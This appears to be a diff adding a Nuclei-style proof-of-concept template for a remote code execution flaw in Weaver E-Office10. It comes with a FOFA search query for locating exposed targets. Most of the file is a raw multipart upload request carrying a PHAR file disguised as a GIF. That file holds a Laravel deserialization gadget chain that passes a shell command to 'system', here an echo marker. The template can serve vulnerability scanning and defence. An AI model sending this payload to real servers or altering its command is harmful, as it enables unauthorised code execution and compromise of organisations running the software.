@@ -1,0 +1,65 @@
+id: poc-dqwpmbgr61h96wak
+info:
+  name: 泛微E-Office10版本小于v10.0_20240222 远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dqwpmbgr61h96wak'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dqwpmbgr61h96wak
+    fofa: app="泛微-EOffice"或body="eoffice_loading_tip" && body="eoffice10"
+http:
+- raw:
+  - 'POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
+
+
+    Accept: string("*/*")
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Content-Type: multipart/form-data; boundary=jzdwsbic
+
+
+
+
+    --jzdwsbic
+
+
+    Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+
+
+    Content-Type: image/jpeg
+
+
+
+
+    GIF89a<?php __HALT_COMPILER(); ?>
+
+
+    D.....................O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:".*.events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:".*.queueResolver";s:6:"system";}s:8:".*.event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";s:37:"echo 9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P";}}....test.txt....K..f.....~..........test.).i..f3....2pq....>....GBMB
+
+
+    --jzdwsbic--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    attachment_id
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
